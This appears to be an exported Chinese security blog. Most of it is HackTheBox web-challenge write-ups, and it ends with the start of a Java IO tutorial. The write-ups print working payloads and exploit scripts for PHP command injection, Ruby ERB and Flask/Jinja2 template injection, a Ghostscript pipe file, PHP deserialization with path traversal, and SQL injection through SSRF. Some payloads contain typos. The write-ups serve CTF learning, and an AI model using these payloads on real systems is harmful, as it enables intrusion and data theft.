encode_payload(payload):\n\npayload = u'\"a\"\\nexec \"\"\"' + payload + u'\"\"\"'\n\nblacklist = &#123;\n\n'[': '\\\\x5b',\n\n'(': '\\\\x28',\n\n'_': '\\\\x5f',\n\n'.': '\\\\x2e'\n\n&#125;\n\nfor c,h in blacklist.items():\n\nif c in payload:\n\npayload = payload.replace(c, h)\n\nreturn payload\n\ndef modify_cookie(s):\n\nf = flask_encoding()\n\ncookie_dict = f.deserialize(s.cookies['session'])\n\ncookie_dict['ingredient'] = u'i'\n\ncookie_dict['measurements'] = encode_payload(PAYLOAD)\n\ns.cookies['session'] = f.serialize(cookie_dict)\n\nreturn s, f\n\ndef exec_rce(s, f):\n\nr = s.get(TARGET)\n\ntry:\n\nenc_exfil_data = r.cookies['session']\n\nexcept KeyError:\n\nprint('Exploit failed, session cookie not found!')\n\nexit(1)\n\nreturn f.deserialize(enc_exfil_data)\n\ndef main():\n\ns = requests.session()\n\ns.get(TARGET)\n\ns, f = modify_cookie(s)\n\nexfil_data = exec_rce(s, f)\n\nprint(exfil_data['x'])\n\nif __name__ == '__main__':\n\nmain()\n\n0x05 总结太难了，光是正则就够我吃一壶的了。再加上自己对于魔法函数的应用还是太差了，以后回过头来可以再看看。\nHackTheBox-LoveTok0x01 简单分析靶场\n靶场界面如图所示\n\n\n\nf12 一下发现一串 SHA512 的序列\nsha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ&#x3D;&#x3D;\n先放着吧，说不定到时候就用到了。\n提示语也挺…… 嗯…… crazy 的。\n\n\n点击下面的按钮，生成了 Find Love 的时间，没什么用，再去扫一下目录吧。\n\n等待扫目录的时间，将其源代码拉下来看看，可能又要代码审计了。\n\n0x02 代码审计单刀直入，寻找 flag找遍所有文件，并未发现与 flag 有关的地方，这莫非是靠目录遍历打？或者是 上传 webshell 吗。思路不太确定，再看看代码吧\n未寻找到 flag，需要静下心来代码审计既然没有获取到 flag 的代码，那么确定下来漏洞&#x2F;思路是命令执行，最终构造出来的 payload 一定是这样的\nxxxxxx/cat/flag\n\n\n看完了整个文件夹当中的 php 文件，在 TimeModel 函数下找到了可控变量 format\n先简单介绍一下在 format 之前的 addslashes 函数\n\nphp addslashes 函数的作用是在预定义的字符前面加上反斜杠，这些预定义字符包括：单引号（’）；双引号（”）；反斜杠（\\）；NULL\naddslashes 函数经常使用在向数据库插入数据时，比如有一个字符串\n$str=“my name’s wxp”;\n\n现在要将这个字符串插入到数据库表中，由于该字符串有单引号’，这样很可能与 MySQL 拼接字符串的单引号’冲突，导致 SQL 语句不正确，也就无法正常执行插入操作，此时我们需要使用 addslashes 函数处理这个字符串。如：\n$str=“my name’s wxp”;\n\necho addslashes($str);//输出my name’s wxp\n\n如果字符串$str&#x3D;”my name’s wxp”是使用POST和GET提交的数据，这个时候插入数据库中的数据是带反斜杠的，可知 addslashes 只是在 POST 和 GET 数据插入数据库时才会把反斜杠同时插入到数据库，其他情况下不会将反斜杠插入到数据库。\n利用可控制变量 format\n去查阅了一下 php 当中一般的命令执行 payload，并且浅探一下原理\n\nphp GET 请求当中，可以通过 ?id=$&#123;phpinfo()&#125; 这种简单的方式进行命令执行\n当我们使用 $&#123;&#125; 时，内部的函数会被执行，一般出现这种现象都是后台未对传进的参数进行过滤&#x2F;防御&#x2F;校验。从而才会导致命令执行漏洞。\n我们先编写 poc，在这一 poc 中，直接就执行 phpinfo 的命令了\nhttp:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;phpinfo()&#125;\n\n\n\n证明存在命令执行漏洞了，接着构造一下外带数据传参执行(这里直接命令执行是行不通的)。\nhttp:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET(0))&#125;&amp;0&#x3D;ls\n\n\n\n原本想着 ls 直接搞出 flag 了，可谁知半路杀出个程咬金，命令执行失败了，这时猛地想到 format 之前有一个 addslashes 函数。所以，直接加上 / 即可\nhttp:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET(0))&#125;&amp;0&#x3D;ls &#x2F;\n\n成功执行\n\n\n最上面一行有一个 flagRPYIs，那么尝试 cat flagRPYIs，进一步构造 payload\nhttp:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET[0])&#125;&amp;0&#x3D;cat+&#x2F;flagRYPIs\n\n这里的 / 要写在前面。\n\n\n成功过了 ~\n0x03 小结本题是一道简单的 php 命令执行，难点在于 addslashes 这一函数很容易被大家所忽视，这也给实战渗透时的命令执行绕过提供了一些思维。\nHackTheBox-Neonify0x01 前言HTB 最近又新出了几道题，来刷一刷看看。\n0x02 初识靶场\n靶场界面如图所示\n\n\n\n算是一个不怎么难看的靶场，我们在框内输入任意内容，下面一行字符便会变成我们输入的。\n看到一个框，第一想法一定是 XSS，尝试输入 &lt;scipt&gt; alert(1) &lt;/script&gt;，输入之后无特殊回显，感觉是过滤了字符与空格(?) 这里先打个问号。\n感觉暂时没什么思路了，看源码吧。\n\n源码居然是 Ruby 写的后端，还是第一次看 Ruby 的代码审计。\n\n0x03 代码审计\n首先还是先看路由\n\n\n\n乍一看没什么，感觉突破点只能是在这一段代码了\nif params[:neon] =~ /^[0-9a-z ]+$/i\n\n上谷歌去搜索一下，发现 Ruby 后端正则若是这么写会产生换行绕过。\n\n\n于是 neon=1111%0axxxxj!&lt;&gt; 绕过正则限制\n\n\n\n感觉没什么用啊。前两天在看 SSTI，说到 Ruby 当中的模板引擎 ERB 中很可能存在 SSTI，尝试寻找一下 SSTI 点。\n\nERB 的语法如下\n&lt;% %>   在括号内执行 Ruby 代码\n\n&lt;%= %>  在 ERB 文件中打印一些东西\n\n&lt;%= rand(n) %>   随机生成 0 到 n-1 之间的随机数\n\n&lt;% -%>  避免在表达式后中断行\n\n&lt;%# %>  括号内的注释；未发送到客户端(与HTML注释相反)\n\n\n思路出来了：在 POST 请求当中对 neon 参数进行 SSTI\n\n0x04 构造 EXP先探测 SSTI 的存在性，再进一步编写 EXP。Payload 如下\n1111\nxxxxj!&lt;h1>&lt;%= 7*7 %>&lt;/h1>\n\n\n这里记得进行 URL 编码，查看回显。\n\n\n\n已经探测出 SSTI 的存在性，我们尝试将 7*7 的地方替换为 system，exec 等命令执行语句。\n1111\nxxxxj!&lt;h1>&lt;%= exec ('cat f*') %>&lt;/h1>\n\n\n\n但是传统的 system,exec 都无法直接回显。都要通过 vps 反弹 shell。\nfile = '|whoami'  \nputs open(file).read() # ubuntu  \nputs open(file).gets # ubuntu\n\nopen可以回显出命令执行结果。\n因此我们构造payload即可得到flag\nneon=1111%0axxxxj!&lt;h1>&lt;%25=open('|cat f*').read()%25>&lt;/h1>\n\n\n\n\nFlag: HTB{r3pl4c3m3n7_s3cur1ty}\n\n0x05 小结本道题是 SSTI 的简单应用，结合正则表达式的绕过，挺有意思的一道入门级别题目。对于看着人畜无害的代码，实际上却隐藏了 RCE 的危害漏洞，给我们渗透也带来了不少的思路，看到源码时多看两眼，耐心一点。\nHackTheBox-petpet-rcbee0x01 前言最近做 HTB 的题目打算先尝试一遍基础的漏洞挖掘，挖掘不出来的情况下再去看源代码。\n\n攻 –&gt; 攻的原理 –&gt; 守\n\n0x02 漏洞挖掘靶场界面如图所示\n\n\n一看便是文件上传类的题目，尝试上传一句话木马，却返回状态码 500\n\n\n这里我的感觉是后台加了一些的验证，比如文件内容什么的，尝试上传一下正常的 png&#x2F;jpeg 图片\n\n\n上传了一个 png 文件，接着图中之前在飞的小蜜蜂就变了，变成了一只手一直触摸上传的图片的 Gif，还是直接看源码吧。\n\n翻源码去看一看\n\n0x03 源码剖析，代码审计先打开 util.py，寻找状态码为 500 的原因\n\n\n代码审计，逐行分析try:\n\ttmp_path = save_tmp(file)\n\tbee = Image.open(tmp_path).convert('RGBA') // 将当前的图片的模式转换为 RGBA\n\tframes = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))] // 把上传的图片存放到静态文件夹当中\n\tfinalpet = petmotion(bee, frames) // 设置图片尺寸\n\tfilename = f'&#123;generate(14)&#125;.gif'  //  加载 gif\n\tfinalpet[0].save(\n\t\tf'&#123;main.app.config[\"UPLOAD_FOLDER\"]&#125;/&#123;filename&#125;',\n\t\tsave_all=True,\n\t\tduration=30,\n\t\tloop=0,\n\t\tappend_images=finalpet[1:],  // 设置文件属性\n \t)\n\n \tos.unlink(tmp_path)  \n \treturn &#123;'status': 'success', 'image': f'static/petpets/&#123;filename&#125;'&#125;,200\n\n except:\n \treturn &#123;'status': 'failed', 'message': 'Something went wrong'&#125;, 500\n\n不知道为什么我总是觉得这个没有什么过滤，不过最后我上传的文件被 convert(&#39;RGBA&#39;) 之后，一定会被转化成图片的样子，所以需要在编写 exp 上多花一些功夫。需要在静态界面去弹 flag。\nexp 的编写此 exp 摘自网上首先是文件头，需要表明自己是图片的身份\n\n文件头：\n\n%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: -0 -0 100 100  &#x2F;&#x2F; ESPF 的文件头\n\nuserdict &#x2F;setpagedevice undef\nsave\nlegal\n&#123; null restore &#125; stopped &#123; pop &#125; if\n&#123; legal &#125; stopped &#123; pop &#125; if\nrestore\nmark &#x2F;OutputFile (%pipe%car flag &gt;&gt; &#x2F;app&#x2F;application&#x2F;sttic&#x2F;petpets&#x2F;flag.txt) currentdevice putdeviceprops\n\n编写完 exp 后上传文件，再访问 http://134.209.28.38:31489/static/petpets/flag.txt\n\n\n0x04 回头看 exp，探究一下原理查阅很多的资料，最相关的是 ImageMagick 的一些 CVE 的复现。最后发现是 PostScript 写的，需要 ghostScript 作为解释器。作为小 exp 即可。\nHackTheBox-Phonebook0x01 靶场简单分析\n界面如图所示\n\n\n\n题目的描述: Who is lucky enough to be included in the phonebook?\n这感觉是只要登录进去即可获得 flag 吧？\n又看到下面那句话\n\n\n总归是身份认证的问题，先试试爆破，再尝试 SQL 注入。\n0x02 做题历程先随意输入数据，再抓包看一看\n\n\n尝试发包爆破，可能是自己字典不太好，爆破失败。—————— 但总感觉这里的用户名是 Reese，直接爆破一番。\n\n\n尝试一下 SQL 注入，先用万能密码。失败\n\n尝试使用通配符 “*“ 登录，用户名密码都设置为 *，登录成功，但界面并无数据与 flag。\n\n\n\n接着我们搜索 Reese，因为题目刚开始的 hint 中，是 Reese 说的话，由此猜测 Reese 可能是开发人员，或者是有较高权限的人，找到 Reese 之后再回到登录界面爆破。走来走去最后还是爆破，笑死。\n\n结果是爆破不出来，太邪门了，密码就是 flag\n这不知道源码是怎么写的真的想看看。\n\n尝试密码 HTB*，居然登录成功\n0x03 编写 exp编写爆破脚本\nimport requests\nurl='http://159.65.81.40:30797/login'\nr=requests.session()\nt=0\nd='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;'\npassword=''\nflag='HTB&#123;'\nwhile(t!=1):\n    for i in range(0,len(d)):\n        password=flag+d[i]\n        print('[-]testing  %s     ' %(flag+d[i]),end='')\n        password=password+'*'\n        data=&#123;\n            'username':'reese',\n            'password':password\n        &#125;\n        html=r.post(url=url,data=data).text\n        if('No search results' in html):\n            flag+=d[i]\n            print(\"success\")\n            print(\"[+]%s\" %flag)\n        else:\n            print(\"failed\")\n        if(flag[len(flag)-1]=='&#125;'):\n            t=1\nprint(\"flag:%s\" %flag)\n\n\n\nflag: HTB{d1rectory_h4xx0r_is_k001}\nHackTheBox-Templated0x01 靶场简单分析\n靶场界面如图所示\n\n\n\n题目的描述是 Can you exploit this simple mistake?\n并不是特别有思路，靶场界面说此界面还仍在建造当中，那会不会是里面还存在着备份文件？试试吧先。\n备份文件并不存在，难搞，再看看。\n&#x2F;templates 一般就是 Java 的接口文件夹，通过写接口去访问的，这里我们尝试一下 &#x2F;templates，看看能不能获取到资源。\n\n\n这里感觉有点奇怪，接着我又换了其他的接口，还是差不多的界面，抓包后就更加疑惑了，明明状态码是 200，出来的界面却是 404？\n\n第一反应是界面写了 404 界面的问题，就是手动编写 404 界面。\n\n\n看到这里的下面一行 “Proudly Powered by Flash&#x2F;jinja2”这是 python flask 开发的部分，因为自己没有这方面的技术栈，去找一找相关的漏洞，并熟悉一下知识。\n\n0x02 payload这里先挂上 payload 吧，后续再来讲原理。\n/&#123;&#123;config&#125;&#125;\n\n\n0x03 利用方法这里就可以通过python的魔术方法，首先通过__class__获取对象的类，然后__mro__获取对象继承的类，因为所有的对象都是继承自object，这样就可以拿到object类了，再通过__subclasses__获取到object的子类，子类中的&lt;class &#39;warnings.catch_warnings&#39;&gt;的命名空间里有__builtins__，最后使用__import__方法导入os库就可以任意命令执行了。最后的payload如下。 —————— 摘自flythief 师傅博客\npayload：\n&#123;&#123; \"\".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"cat flag.txt\").read() &#125;&#125;\n\n0x04 总结本题是基于 python 的 Flask 的 ssti 漏洞，完全不会，去学一下，后续总结。移步至Python Flask模板注入 | 芜风 (withd-raw.github.io)\nHackTheBox Toxic见题看代码便知，是 PHP 反序列化漏洞\n\n\n0x01 一些前置知识\n部分内容摘自 twosmi1e师傅\n\n1. PHP序列化是什么两个函数serialize()     //将一个对象转换成一个字符串\nunserialize()   //将字符串还原成一个对象\n通过序列化与反序列化我们可以很方便的在 PHP 中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造 payload 攻击。\n体验一下序列化和反序列化\n序列化，将一个对象转换为字符串\n\n// 首尾的 php 头因为博客代码高亮 bug 已省略\n class test\n &#123;\n private $flag = \"flag&#123;233&#125;\";\n public $a = \"aaa\";\n static $b = \"bbb\";\n &#125;\n  \n $test = new test;\n $data = serialize($test);\n echo $data;\n\n\t \n\t \n输出---> O:4:\"test\":2:&#123;s:10:\"testflag\";s:9:\"flag&#123;233&#125;\";s:1:\"a\";s:3:\"aaa\";&#125;\n\n\n\n\n反序列化，将一个字符串转换为对象\n\n// 首尾的 php 头因为博客代码高亮 bug 已省略\n $str = 'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D';\n\n $data = urldecode($str);\n $obj = unserialize($data);\n var_dump($obj);\n\t \n\t \n输出---> O:4:\"test\":2:&#123;s:10:\"testflag\";s:9:\"flag&#123;233&#125;\";s:1:\"a\";s:3:\"aaa\";&#125;\n\n2. php 的魔术方法PHP 的魔术方法同 Python 当中的定义一样，也就是函数名前面加上 __ \n常见的 PHP 魔术方法如下\n__construct()//创建对象时触发\n__destruct() //对象被销毁时触发\n__call() //在对象上下文中调用不可访问的方法时触发\n__callStatic() //在静态上下文中调用不可访问的方法时触发\n__get() //用于从不可访问的属性读取数据\n__set() //用于将数据写入不可访问的属性\n__isset() //在不可访问的属性上调用isset()或empty()触发\n__unset() //在不可访问的属性上使用unset()时触发\n__invoke() //当脚本尝试将对象调用为函数时触发\n\n而在本题中，出现了序列化与反序列化，同时也出现了魔术方法 ———— __destruct()，开搞。\n0x02 __destruct() 魔术方法的反序列化利用\n首先 __destruct() 函数是在反序列化的过程中，也就是执行 uniserialize 的过程中运行的。\n\n__destruct() 是在对象被销毁时触发。\n那么当传进去的对象 or 参数，也就是被反序列化的参数是可控的情况下，我们可以直接修改参数，使反序列化解析出错，从而导致 __destruct() 被先执行，可以导致命令执行漏洞。\n0x03 回到题目，分析题目源码部分先看 index.php 的代码，其中最引人注目的便是 Cookie\n\n\n逐行分析 ———— index.php\nif (empty($_COOKIE['PHPSESSID']))\n&#123;\n $page = new PageModel;\n $page->file = '/www/index.html';  // 读取 www/index.html\n setcookie('PHPSESSID',base64_encode(serialize($page)), // 先进行序列化操作，再进行 base64 编码\n time()+60*60*24,\n '/'\n );\n&#125;\n\n$cookie = base64_decode($_COOKIE['PHPSESSID']); //base64 解码\nunserialize($cookie); // 反序列化，将字符串转换为对象\n\n\n题目部分(1). 利用 cookie\n先抓包，获得 Cookie\n\n\n\n尝试将 Cookie 的这一串进行解码，查看一下。\n\n\n这里的 &#x2F;www&#x2F;index.html，尝试是否能够进行其他文件的读取，这里尝试读取 &#x2F;etc&#x2F;passwd，并且进行目录遍历的混合攻击，查看回显。\n\n\n\nbase64 编码  (此处巨坑)Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL2V0Yy9wYXNzd2QiO30&#x3D;\n\n发包之后无响应，因为 &#x2F;etc&#x2F;passwd 这种文件肯定不可能在 &#x2F;www 的目录下，所以使用目录遍历攻击，逐个尝试，当目录遍历至第五层的时候成功。\nO:9:\"PageModel\":1:&#123;s:4:\"file\";s:15:\"../../../../etc/passwd\";&#125;\n\nbase64 的编码：Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==\n\n再发包，还是没有回显，真的坑，后来看了 WP 才知道，要把 s 的后面一个值改成 25。\nO:9:\"PageModel\":1:&#123;s:4:\"file\";s:25:\"../../../../etc/passwd\";&#125;\n\nbase64 的编码：\nTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==\n\n\n\n在这一次的发包当中我们是看到了 nginx 用户的\n(2). 读取 nginx 用户的日志文件因为我们已经知道了 nginx 用户所在的位置，所以第二次的 payload 就无须再使用 ../ 来目录遍历了，直接访问 nginx 目录即可。\nO:9:\"PageModel\":1:&#123;s:4:\"file\";s:25:\"/var/log/nginx/access.log\";&#125;\n\nbase64 编码 ---> Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==\n\n\n(3). 利用 User-Agent 进行命令执行猜测 User-Agent 可以用来注入，即可以在 User-Agent 中进行命令执行，这里的 Cookie 还是使用上述的 access.log 的 payload，多发几次包(这里一定要多发几次，我真的踩坑踩死了)\n\n\n这里有一个 “flag_B1lqM” 的文件，我们尝试进一步读取这一文件。此时已知 “flag_B1lqM” 的文件在 www 目录的文件夹下，所以获取 flag 文件，只需要让程序读取 flag，进行一遍序列化+反序列化的操作即可，所以构造 payload：\nO:9:\"PageModel\":1:&#123;s:4:\"file\";s:25:\"/flag_B1lqM\";&#125;\n\nbase64 编码--->\nTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL2ZsYWdfQjFscU0iO30=\n\nGetFlag ~\n\n0x04 小结\n题目并不算难，是基于 php 反序列化漏洞，与目录遍历漏洞相结合的一道题目。主要是会踩很多的坑 ……\n\n\nHackTheBox-Under-Construction0x01 前言近期调整状态中……\n0x02 初识靶场靶场界面如图所示\n\n\n看到这么一个登录注册的功界面，第一感还是 SQL 注入的。\n在登录界面尝试万能密码，SQL 注入失败，转向注册界面。点击 Register 之后跳转失败，还是停留在 &#x2F;auth 界面。没找到注册界面，这里可以利用 Burpsuite 寻找目录，但是节省时间，我们直接代码审计，最后发现居然没有注册界面 ……\n\n原来就是没有注册界面的，需要我们抓包后进行修改\n\n先将 GET 请求中的参数 error 删除掉，再将 Referer 的参数 error 也删除掉，最后添加 username 与 password。\n\n\n我们以 admin，123 进行注册，毕竟是 CTF 嘛，不要用 admin，admin 比较好。\n注册进入之后的界面如图所示\n\n\n看着没什么搞头的样子，抓包看一看。发现了我们的老朋友，哟，这不是 JWT 吗 ~\n我们先前 Login 的时候，会在 Response 响应包处产生一个 JWT，而产生的 JWT 也会应用于登录进之后界面的 Cookie，把 JWT 解密一下。\n\n\n\nAll Right，基本的 Web 界面运行是差不多了，是时候开始我们的下一步 ———— 代码审计了。\n\n0x03 代码审计老样子，先看路由。我个人感觉是没什么东西阿，既没有 Flag，也没有命令执行类的明显漏洞，莫非要寄了？\n\n\n看着没啥东西，去到管理登录的 DBHelper.js 文件看一看，没想到居然是 SQL 语句 ~！\n在预编译盛行的时代中，第 11 行的内容太抓我的眼球了，一看就是 SQL 注入阿！\n\n\n我们定位到 getUser 的方法，看一看谁调用了它。\n\n\n到这里就可以确定整个题目的思路了，首先 GET 请求 / 时，携带利用公钥伪造的 JWT，而 JWT 中的 username 字段值为 SQL 注入语句，执行后就可以进入数据库查找 flag 了。注入点在 Cookie 中的 JWT 中的 username 哈哈哈，有点绕。\n0x04 Exploit of it这个漏洞的利用完全是脑洞题了……直接快速过了吧\n\n用到的工具：jwt_tools，Python 的 pycryptodomex\n\ngit clone https://github.com/ticarpi/jwt_tool\npip3 install pycryptodomex\n\n\n\n然后就是一套的 SQL 注入即可，不难。\nflag HTB&#123;d0n7_3xp053_y0ur_publ1ck3y&#125;\nHackTheBox-WeatherApp0x01 靶场简单分析靶场界面如图所示\n\n\n提示语是很长一段，翻译过来之后如图\n\n\n\n中间有一段话引人注目\nThis weather application is notorious for trapping the souls of ambitious weathermen like me.\n这里有点感觉，这个网站应该是钓鱼的网站，通过天气预报钓鱼。\n\n再分析一下，它这里的 ublock 会把一部分给 block 掉。关闭 ublock，再刷新一下网站看看是否有奇效。呃，怪怪的。打开 f12 之后，边上又出现了更怪的\n\n\n0x02 开打面对这么一个奇怪的网站，必然是先扫描目录了 ~ 扫出来了一个登录注册界面，运气还可以噢，上去康康。\n\n\n登录界面尝试在登录界面，一开始是使用 123 登录的，登录后回显为 “You are not admin”。嗯，感觉用户名是 admin，而且 admin 拥有较高的权限，是本题破解的核心所在。而不论输入任何 username 都会被保存，有点 shiro 的感觉。\n尝试用 admin 登录，回显如下图所示\n\n\n\n\n爆破的闲暇时间尝试一下是否存在 SQL 注入，说实话在输入 admin 之后就感觉不存在 SQL 注入了，感觉更像 shiro 的工作方式。\n尝试 SQL 注入，失败，回到 register 界面康康。\n\n注册界面尝试一般来说如果登陆界面不存在 SQL 注入的话，可以多试试 register 注册界面。原因详见 —————— 注册界面的 SQL 注入\n让我没想到的是，注册界面直接 401 了………………\n\n\n而且报错之后会直接返回到 login 的界面 ………… 匪夷所思\n\n爆破的结果也出来了，寄\n\n\n\n看到题目中的附件，下载下来看一看。然后就直接看到了 flag 哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈笑死，但肯定不能这么做。\n\n\n这里移步至 “index.js” 的界面下，这里面是一堆判断的东西。\n\n\n\n第 19 行 – 第 34 行，很清楚得解释了为什么注册的时候会是返回 401 的状态码。\n\n第 36 行 – 第 53 行，审计登录界面，并获取 flag\n\n针对上述问题，逐一审计并破解\n\n\n0x03 代码审计1. 审计获取 flag 的条件先把获取 flag 的代码单独贴出来\n\n\nrouter.get('/login', (req, res) => &#123;\n\treturn res.sendFile(path.resolve('views/login.html'));\n&#125;);\nrouter.post('/login', (req, res) => &#123;\n\tlet &#123; username, password &#125; = req.body;\n\tif (username &amp;&amp; password) &#123;\n \t\treturn db.isAdmin(username, password)\n\t\t\t.then(admin => &#123;\n\t\t\t\tif (admin) return res.send(fs.readFileSync('/app/flag').toString());\n\treturn res.send(response('You are not admin'));\n &#125;)\n \t\t\t.catch(() => res.send(response('Something went wrong')));\n &#125;\n \treturn re.send(response('Missing parameters'));\n&#125;);\n\n\n获取 flag 的条件：成为 admin 用户\n\n再回去寻找成为 admin 用户的条件，这里主要两种方式吧，分为原本的数据库当中是否存在 admin 用户。\n如果数据库不存在 admin 用户如果数据库是不存在 admin 用户的话，需要靠注册来实现，注册一个名为 admin 的账户。而在之前，代码审计的时候发现注册的过程当中会存在 401 的情况。\n\n所以如果数据库当中不存在 admin 用户的话，需要去审计注册界面的，感觉是存在 SSRF\n\n如果数据库存在 admin 用户那这里就感觉是 SQL 注入了，想办法把 admin 的密码爆出来，或者是通过联合查询的方式篡改密码。\n\n\n进一步分析，看一看 admin 到底在哪儿。\n\n2. 审计查找 admin在文件夹中寻找到了 database.js 这个文件，感觉是突破口，代码审计一下。\n\n\n\n其中的数据库操作，第 24 行，里面的语句表明数据库里面已存在 admin 这一账户了INSERT INTO users (username, password) VALUES ('admin', '$&#123; crypto.randomBytes(32).toString('hex')\n同时密码是随机生成的，我们想要通过正常的暴力破解是没有用的，剩下的就是通过注入的方式获取密码。\n\n来看到 Register 这里的判断，对输入的 username 和 password 并没有进行处理。\n\n\n再康康判断 admin 的函数 “isadmin”\n\n\n我们想要成为 admin 用户，就必须知道 admin 用户的密码，而且注入点也是已知的了，在 Register 地方，其实之前的思路也算是正确了一部分，但是被 Register 的 401 给拦截掉了，应该早点想到 SSRF 的。\n3. 寻找可攻击的 SSRF 点到 helpers 文件夹里面找，发现 “weatherData” 是可控的，此处存在 SSRF。\nlet weatherData = await HttpHelper.HttpGet(`http://$&#123;endpoint&#125;/data/2.5/weather?q=$&#123;city&#125;,$&#123;country&#125;&amp;units=metric&amp;appid=$&#123;apiKey&#125;`);\n\n再回去找这个函数 “HttpHelper” 的方法 HttpGet\n\n\n\n辗转多次，发现让我们在 &#x2F;api&#x2F;weather 里面构造 SSRF，通过 SSRF 访问 Register 接口，在 Register 接口处进行 SQL 注入。\n\n构造 SQL 语句的 payload\nusername&#x3D;admin&#39;)\npassword&#x3D;1&#39;) ON CONFLICT(username) DO UPDATE SET password &#x3D; &#39;admin&#39;;--\n\n\n构造完 SQL 注入的语句过后，下一步就是 SSRF 了。\n\n修改 host 为 127.0.0.1，构造 SSRF\nPOST /register HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 87\nusername=admin')&amp;password=1') ON CONFLICT(username) DO UPDATE SET password = 'admin';--\n写 exp 脚本，此处借用其他人的 exp\nimport requests\n\nurl = \"http://167.172.52.221:30483\"\n\nusername=\"admin\"\n\npassword=\"123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--\"\nparsedUsername = username.replace(\" \",\"\\u0120\").replace(\"'\", \"%27\").replace('\"', \"%22\")\nparsedPassword = password.replace(\" \",\"\\u0120\").replace(\"'\", \"%27\").replace('\"', \"%22\")\ncontentLength = len(parsedUsername) + len(parsedPassword) + 19\nendpoint = '127.0.0.1/\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1\\u010D\\u010A\\u010D\\u010APOST\\u0120/register\\u0120HTTP/1.1\\u010D\\u010AHost:\\u0120127.0.0.1\\u010D\\u010AContent-Type:\\u0120application/x-www-form-urlencoded\\u010D\\u010AContent-Length:\\u0120' + str (contentLength) + '\\u010D\\u010A\\u010D\\u010Ausername='+parsedUsername + '&amp;password='+ parsedPassword + '\\u010D\\u010A\\u010D\\u010AGET\\u0120/?lol='\n\ncity='test'\n\ncountry='test'\n\njson=&#123;'endpoint':endpoint,'city':city,'country':country&#125;\n\nres=requests.post(url=url+'/api/weather',json=json)\n\n\n执行 exp 成功之后再返回到登录界面，使用 admin，admin 登录即可。\n\n0x04 小结这道题目难度中等，如果不提供源码的话是非常难以解决的，虽然可以想到 SSRF，但有点盲人摸象的感觉。\n加上 nodejs 的数据包传输问题，构造 exp 较为麻烦。建议初学者不一定要读懂 exp，只是简单了解做题的思路即可。\n","categories":["CTF"],"tags":["CTF刷题"]},{"title":"Java-IO流","url":"/2022/05/30/Java-IO%E6%B5%81/","content":"Java-IO 流\n\nJava-IO流\n向 Lxxx 大佬学习！\n\n0x01 前言IO是指 Input&#x2F;Output，即输入和输出。以内存为中心：\n为什么要把数据读到内存才能处理这些数据？因为代码是在内存中运行的，数据也必须读到内存，最终的表示方式无非是 byte数 组，字符串等，都必须存放在内存里。\n从 Java 代码来看，输入实际上就是从外部，例如，硬盘上的某个文件，把内容读到内存，并且以 Java 提供的某种数据类型表示，例如，byte[]，String，这样，后续代码才能处理这些数据。\n因为内存有“易失性”的特点，所以必须把处理后的数据以某种方式输出，例如，写入到文件。Output 实际上就是把 Java 表示的数据格式，例如，byte[]，String等输出到某个地方。\nIO 流是一种顺序读写数据的模式，它的特点是单向流动。数据类似自来水一样在水管中流动，所以我们把它称为 IO 流。\n\n在讲 IO 流之前，我们先讲一讲 Java 关于文件的一些操作。\n0x02 创建文件的三种方式因为与文件有关，我这里的路径也贴出来比较好\n\nReappearance\\Serialable\\src\\IOStream\n准备将文件都放到新建的 CreateForFile 文件夹中\n\n建议路径跑通一个之后，其余复制粘贴路径。\n1. 根据路径创建一个 File 对象\n方法 new File(String pathname)\n\npackage src.IOStream;  \n  \nimport java.io.File;  \nimport java.io.IOException;  \n  \n// 根据路径创建一个 File 对象  \npublic class newFile &#123;  \n    public static void main(String[] args) &#123;  \n        createFile();  \n &#125;  \n    public static void createFile()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateForFile/new1.txt\");  \n try&#123;  \n            file.createNewFile();  \n System.out.println(\"Create Successfully\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n  \n&#125;\n\n2. 根据父目录 File 对象，在子路径创建一个文件\n方法 new File(File parent, String child)\n\npackage src.IOStream;  \n  \nimport java.io.File;  \nimport java.io.IOException;  \n  \n// 根据父目录File对象，在子路径创建一个文件  \npublic class newFile02 &#123;  \n    public static void main(String[] args) &#123;  \n        createFile();  \n &#125;  \n    public static void createFile()&#123;  \n        File parentFile = new File(\"Serialable/src/IOStream/CreateForFile\");  \n File file = new File(parentFile, \"new2.txt\");  \n try&#123;  \n            file.createNewFile();  \n System.out.println(\"Create Successfully\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n其实和第一个方法大同小异。\n3. 根据父目录路径，在子路径下生成文件\n方法 